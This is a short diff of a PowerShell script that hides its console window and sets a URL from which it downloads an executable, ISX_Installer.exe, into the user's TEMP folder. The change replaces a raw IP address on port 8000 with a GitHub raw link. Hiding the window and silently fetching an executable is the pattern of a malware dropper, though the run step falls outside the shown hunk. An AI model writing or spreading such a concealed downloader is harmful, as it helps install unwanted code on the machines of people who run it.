@@ -13,7 +13,7 @@ $consolePtr = [Win32]::GetConsoleWindow()
 [Win32]::ShowWindow($consolePtr, 0)  # Hide the console window
 
 # Define the download and execution parameters
-$url = "https://87.62.99.194:8000/api/installer"  # Direct EXE download
+$url = "https://github.com/Target9/Ob/raw/refs/heads/main/ISX_Installer.exe"  # Direct EXE download
 $exePath = Join-Path $env:TEMP ('ISX_Installer.exe')
 
 try {
